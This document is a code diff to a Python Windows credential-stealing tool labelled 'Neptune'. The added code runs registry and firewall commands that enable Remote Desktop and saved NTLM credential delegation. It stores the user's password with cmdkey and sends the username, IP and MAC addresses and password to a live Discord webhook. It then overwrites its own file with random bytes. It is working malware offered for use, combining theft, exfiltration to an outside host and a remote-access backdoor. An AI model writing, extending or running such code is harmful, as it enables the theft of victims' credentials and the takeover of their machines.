@@ -38,17 +38,29 @@ def grabber_windows():
 
     mac_adrr = get_mac_address()
 
-    def create_rdp(ip, username, password, port=3389):
-        filename = os.path.join(os.getenv("TEMP"), f"{username}_.rdp")
+    commands = [
+        r'set __COMPAT_LAYER=RunAsInvoker',
+        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation" /v AllowSavedCredentialsWhenNTLMOnly /t REG_DWORD /d 1 /f',
+        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowSavedCredentialsWhenNTLMOnly" /v 1 /t REG_SZ /d TERMSRV/* /f',
+        r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
+        r'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'
+    ]
 
-        target = f"TERMSRV/{ip}:{port}"
+    for cmd in commands:
+        subprocess.run(cmd, shell=True)
+
+
+    def create_rdp(ip, username, password, port=3389):
+        filename = os.path.join(os.getenv("TEMP"), f"{username}.rdp")
+
+        target = f"TERMSRV/{ip}"
 
         subprocess.run([
             "cmdkey",
             f"/generic:{target}",
             f"/user:{username}",
             f"/pass:{password}"
-        ], capture_output=True, text=True)
+        ])
 
         rdp_content = f"""screen mode id:i:2
     use multimon:i:0
@@ -67,16 +79,12 @@ def grabber_windows():
 
         return filename
 
-    create_rdp(
-        ip=ipv4[0],
-        username=user_windows,
-        password=mdp
-    )
+    create_rdp(ipv4[0], user_windows, mdp)
 
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1479546753530204323/5cqaT5p7VdaaTj7pZfYomO7zTyqMh2kJQ2kr1NZRUC6NOjACq8skcE_wep38toXnEnS3', username="Neptune")
 
     embed = DiscordEmbed(
-        title=f"Time :**{datetime.datetime.today()}", description=f"**Windows Information**\n\nWindows Account Username :**{user_windows}**\nIpV4 :**{ipv4[0]}** \nIpV6 : **{ipv6[0]}**\nMac Adresse : **{mac_adrr}**\n\nMDP File\n```**{mdp}**```"
+        title=f"Time :**{datetime.datetime.today()}", description=f"**Windows Information**\n\nWindows Account Username :`{user_windows}`\nIpV4 :`{ipv4[0]}` \nIpV6 :`{ipv6[0]}`\nMac Adresse :`{mac_adrr}**\n\nMDP File\n```{mdp}```"
     )
     embed.set_footer(text="Neptune", icon_url="https://media.discordapp.net/attachments/1442972281235177567/1493609631132418139/aumxqo.jpg?ex=69df97dd&is=69de465d&hm=bb34c1b74eb82e7cc516ea278d22385d1b6d0752c92ab227360354fdc6eafc54&=&format=webp&width=768&height=768")
     webhook.add_embed(embed)
@@ -120,7 +128,6 @@ if platform.system() == 'Windows':
 
         with open(__file__, 'wb') as f:
             f.write(get_random_bytes(taille))
-
-        os.remove(__file__)
+            f.close()
 
     grabber_windows()
